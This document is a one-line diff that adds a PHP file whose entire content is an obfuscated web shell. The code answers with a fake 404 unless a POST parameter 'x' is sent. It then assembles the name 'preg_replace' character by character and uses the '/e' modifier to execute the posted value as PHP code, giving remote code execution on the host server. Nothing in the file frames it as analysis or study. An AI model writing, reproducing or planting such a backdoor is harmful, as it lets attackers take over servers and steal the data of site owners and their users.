@@ -1,0 +1,1 @@
+<?php if(!$_POST['x']){header('HTTP/1.1 404 Not Found'); exit(); }else{ $s="p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e"; $s("~[discuz]~e",$_POST['x'],"Access"); } ?>
